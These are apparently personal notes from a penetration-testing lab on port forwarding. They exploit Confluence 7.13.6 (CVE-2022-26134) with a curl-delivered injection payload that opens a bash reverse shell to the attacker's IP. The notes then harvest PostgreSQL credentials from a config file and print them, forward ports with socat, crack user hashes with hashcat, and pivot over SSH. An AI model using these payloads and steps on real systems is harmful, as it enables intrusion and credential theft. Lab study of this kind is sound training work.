
192.168.x.x --> Kali IP and CONFLUENCE01 IP network
10.4.x.x       --> PGDATABASE01 IP network
172.x.x.x     --> Third network

add -p 2222 always

we can perform this when we know ip and port where service is listening
# exploit Confluence 7.13.6

discover that site is running on 8090

![[Pasted image 20240514010909.png]]

searched exploit and found it

https://medium.com/@aybala.sevinc/cve-2022-26134-room-tryhackme-2107f5bf2fa7

got reverse shell with below command

```
curl -v http://192.168.158.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.172/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```


# find that it have dual NIC

```
ip addr

ip route
```

/var/atlassian/application-data/confluence/confluence.cfg.xml

read this file and got creds for postgresql for another machine

![[Pasted image 20240514031618.png]]

![[Pasted image 20240514015245.png]]

![[Pasted image 20240514015108.png]]

## creds

postgresql://10.4.233.215:5432/confluence

**pass** D@t4basePassw0rd!
**username** postgres

![[Pasted image 20240514015033.png]]

seen that postgres is running on 10.4.233.215:5432 hat's why we forwarded that port
# connect via socat

```
socat -ddd TCP-LISTEN:3333,fork TCP:10.4.233.215:5432
```

![[Pasted image 20240514015137.png]]

![[Pasted image 20240514015305.png]]
# psql connect

```
psql -h 192.168.233.63 -p 3333 -U postgres
```

then I find cwd_user table

https://www.geeksforgeeks.org/postgresql-psql-commands/

![[Pasted image 20240514015332.png]]
## crack hash with hascat

```
hashcat -m 12001 hash.txt ~/Desktop/rockyou.txt
```

always use --show option with hashcat

![[Pasted image 20240514015347.png]]


# SSH - another port forward

we get creds and get to know SSH is also there! **HOW??**
please don't ask. I am still finding that LOL


after that I just bind that to 2223 and get ssh shell
```
socat TCP-LISTEN:2223,fork TCP:10.4.233.215:22
```

```
ssh database_admin@192.168.233.63 -p2223
```